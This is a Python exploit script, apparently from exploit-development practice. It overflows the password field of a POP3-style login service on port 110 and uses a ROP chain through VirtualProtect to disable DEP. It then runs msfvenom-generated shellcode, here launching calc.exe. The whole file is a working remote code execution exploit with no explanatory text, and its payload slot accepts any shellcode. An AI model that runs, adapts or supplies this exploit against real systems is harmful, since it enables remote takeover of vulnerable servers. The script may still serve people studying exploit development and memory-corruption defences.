#!/usr/bin/python3
from pwn import remote, p32

# !py mona pattern_offset eip
offset = 6703
junk = b"A" * offset

"""
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,     (ESP)
  [in]  SIZE_T dwSize,        (0x1)
  [in]  DWORD  flNewProtect,  (0x40)
  [out] PDWORD lpflOldProtect (&Writable)
);
"""

rop  = b""
rop += p32(0x5f404be5) # pop ecx; ret;
rop += p32(0x5f4d4235) # Writable
rop += p32(0x5f401866) # pop ebx; ret;
rop += p32(0xffffffff) # 0x0 - 0x1
rop += p32(0x5f472dbc) # inc ebx; ret;
rop += p32(0x5f472dbc) # inc ebx; ret;
rop += p32(0x5f401fb0) # pop eax; ret;
rop += p32(0xffffffc0) # 0x0 - 0x40
rop += p32(0x5f465969) # neg eax;
rop += p32(0x5f42c5ff) # pop edi; xchg edx, eax; ret;
rop += p32(0x5f4011f2) # ret;
rop += p32(0x5f40a6ab) # pop ebp; ret;
rop += p32(0x5f40a6ab) # pop ebp; ret;
rop += p32(0x5f4012fa) # pop esi; ret;
rop += p32(0x5f454cdc) # jmp dword ptr [eax];
rop += p32(0x5f401fb0) # pop eax; ret;
rop += p32(0x5f49a2c0) # VirtualProtect()
rop += p32(0x5f495b3d) # pushad; ret;
rop += p32(0x5f4012fa) # pop esi; ret;
rop += p32(0x5f4d4235) # Writable
rop += p32(0x5f40b6d7) # push esp; mov dword ptr [esi + 0x58], edi; mov dword ptr [esi], 0x5f4a6d38; mov eax, esi; pop edi; pop esi; ret 4;
rop += p32(0x414106eb) # jmp $+8;
rop += p32(0x5f447e77) # jmp edi;

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\x4d\x82\x17\x4f\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xb1\x6a\x95\x4f\x49\x6b\xfa\xc6"
shellcode += b"\xac\x5a\x3a\xbc\xa5\xcd\x8a\xb6\xeb\xe1\x61"
shellcode += b"\x9a\x1f\x71\x07\x33\x10\x32\xa2\x65\x1f\xc3"
shellcode += b"\x9f\x56\x3e\x47\xe2\x8a\xe0\x76\x2d\xdf\xe1"
shellcode += b"\xbf\x50\x12\xb3\x68\x1e\x81\x23\x1c\x6a\x1a"
shellcode += b"\xc8\x6e\x7a\x1a\x2d\x26\x7d\x0b\xe0\x3c\x24"
shellcode += b"\x8b\x03\x90\x5c\x82\x1b\xf5\x59\x5c\x90\xcd"
shellcode += b"\x16\x5f\x70\x1c\xd6\xcc\xbd\x90\x25\x0c\xfa"
shellcode += b"\x17\xd6\x7b\xf2\x6b\x6b\x7c\xc1\x16\xb7\x09"
shellcode += b"\xd1\xb1\x3c\xa9\x3d\x43\x90\x2c\xb6\x4f\x5d"
shellcode += b"\x3a\x90\x53\x60\xef\xab\x68\xe9\x0e\x7b\xf9"
shellcode += b"\xa9\x34\x5f\xa1\x6a\x54\xc6\x0f\xdc\x69\x18"
shellcode += b"\xf0\x81\xcf\x53\x1d\xd5\x7d\x3e\x48\x28\xf3"
shellcode += b"\x45\x3e\x2a\x0b\x45\x6f\x43\x3a\xce\xe0\x14"
shellcode += b"\xc3\x05\x45\xea\x89\x07\xec\x63\x54\xd2\xac"
shellcode += b"\xe9\x67\x09\xf2\x17\xe4\xbb\x8b\xe3\xf4\xce"
shellcode += b"\x8e\xa8\xb2\x23\xe3\xa1\x56\x43\x50\xc1\x72"
shellcode += b"\x20\x37\x51\x1e\x88\xd2\xd1\x85\xd4\x1c\x22"
shellcode += b"\x46\xd4\x1c\x22\x46"

payload = junk + rop + shellcode

shell = remote("Windows", 110)
shell.sendlineafter(b"\r\n", b"USER username")
shell.sendlineafter(b"\r\n", b"PASS" + payload + b"\r")
